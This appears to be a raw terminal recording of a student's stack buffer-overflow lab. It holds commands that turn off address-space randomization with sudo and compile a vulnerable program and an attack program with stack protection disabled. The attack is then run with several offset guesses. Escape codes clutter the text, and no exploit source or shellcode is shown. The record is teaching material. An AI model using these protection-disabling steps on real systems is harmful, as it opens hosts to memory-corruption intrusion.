@@ -1,0 +1,82 @@
+Script started on Sat 13 Apr 2019 05:55:49 PM CDT
+]0;tphilli@js-104-73:~[?1034h[js-104-73] tphilli ~-->exitscript Part$Demo.txt[5P./attack 0x1032[Kgcc -z execstack -fno-stack-protector -o attack attack.c [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[4Pvuln vuln.c
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cecho 0 | sudo tee /proc/sys/kernel/randomize_va_space[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cxit[K./attack 0x01ffffffff[K[9P0xffff./attack 0x1032echo 0 | sudo tee /proc/sys/kernel/randomize_va_space[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgcc -z execstack -fno-stack-protector -o attack attack.c [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[4Pvuln vuln.c
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[31Pscript Part3bDemo.txt[13P./part3becho 0 | sudo tee /proc/sys/kernel/randomize_va_space[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C./part3b[Kecho 0 | sudo tee /proc/sys/kernel/randomize_va_space
+0
+]0;tphilli@js-104-73:~[js-104-73] tphilli ~-->echo 0 | sudo tee /proc/sys/kernel/randomize_va_space[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cxit[Kscript Part$Demo.txt[5P./attack 0x1032[Kgcc -z execstack -fno-stack-protector -o attack attack.c [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[4Pvuln vuln.c
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+[01m[Kvuln.c:[m[K In function ‘[01m[Kdumb[m[K’:
+[01m[Kvuln.c:17:9:[m[K [01;35m[Kwarning: [m[Kassignment from incompatible pointer type [enabled by default]
+     hold=(int64_t *)&test;
+[01;32m[K         ^[m[K
+]0;tphilli@js-104-73:~[js-104-73] tphilli ~-->gcc -z execstack -fno-stack-protector -o vuln vuln.c[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cecho 0 | sudo tee /proc/sys/kernel/randomize_va_space[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cxit[Kscript Part$Demo.txt[5P./attack 0x1032[Kgcc -z execstack -fno-stack-protector -o attack attack.c [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kc
+[01m[Kattack.c:[m[K In function ‘[01m[Kmain[m[K’:
+[01m[Kattack.c:20:7:[m[K [01;35m[Kwarning: [m[Kincompatible implicit declaration of built-in function ‘[01m[Kexit[m[K’ [enabled by default]
+       exit(0);
+[01;32m[K       ^[m[K
+[01m[Kattack.c:24:14:[m[K [01;35m[Kwarning: [m[Kincompatible implicit declaration of built-in function ‘[01m[Kmalloc[m[K’ [enabled by default]
+       buff = malloc(bsize); 
+[01;32m[K              ^[m[K
+[01m[Kattack.c:25:12:[m[K [01;35m[Kwarning: [m[Kassignment makes pointer from integer without a cast [enabled by default]
+       addr = get_sp() -offset;
+[01;32m[K            ^[m[K
+[01m[Kattack.c:32:18:[m[K [01;35m[Kwarning: [m[Kassignment makes integer from pointer without a cast [enabled by default]
+       *(addr_ptr)=addr;
+[01;32m[K                  ^[m[K
+[01m[Kattack.c:37:23:[m[K [01;35m[Kwarning: [m[Kassignment makes integer from pointer without a cast [enabled by default]
+       buff[bsize - 1] = (char*)NULL; 
+[01;32m[K                       ^[m[K
+]0;tphilli@js-104-73:~[js-104-73] tphilli ~-->gcc -z execstack -fno-stack-protector -o attack attack.c [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[4Pvuln vuln.c
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cecho 0 | sudo tee /proc/sys/kernel/randomize_va_space[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cxit[Kscript Part$Demo.txt[5P./attack 0x1032
+
+Using address as guess for beginning of attack buffer: 0xffffd4c0
+
+Length of Input String:30
+
+
+Value of Test:ffffadc8
+Value of filename[0]:ffffa9c0
+
+You are going to need a buffer a little larger than:1032
+
+]0;tphilli@js-104-73:~[js-104-73] tphilli ~-->./attack 0x1032gcc -z execstack -fno-stack-protector -o attack attack.c [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[4Pvuln vuln.c
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cecho 0 | sudo tee /proc/sys/kernel/randomize_va_space[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cxit[Kscript Part$Demo.txt[5P./attack 0x1032[K[K[K[Kffff
+
+Using address as guess for beginning of attack buffer: 0xffffd4c0
+
+Length of Input String:30
+
+
+Value of Test:ffffadc8
+Value of filename[0]:ffffa9c0
+
+You are going to need a buffer a little larger than:1032
+
+]0;tphilli@js-104-73:~[js-104-73] tphilli ~-->./attack 0xffff[K[K[K[K0000[K[K01
+
+Using address as guess for beginning of attack buffer: 0xffffd4c0
+
+Length of Input String:30
+
+
+Value of Test:ffffadc8
+Value of filename[0]:ffffa9c0
+
+You are going to need a buffer a little larger than:1032
+
+]0;tphilli@js-104-73:~[js-104-73] tphilli ~-->./attack 0x0001[K[K[K[Kffffffffffff
+
+Using address as guess for beginning of attack buffer: 0xffffd4b0
+
+Length of Input String:30
+
+
+Value of Test:ffffadc8
+Value of filename[0]:ffffa9c0
+
+You are going to need a buffer a little larger than:1032
+
+]0;tphilli@js-104-73:~[js-104-73] tphilli ~-->exit
+exit
+
+Script done on Sat 13 Apr 2019 05:56:43 PM CDT
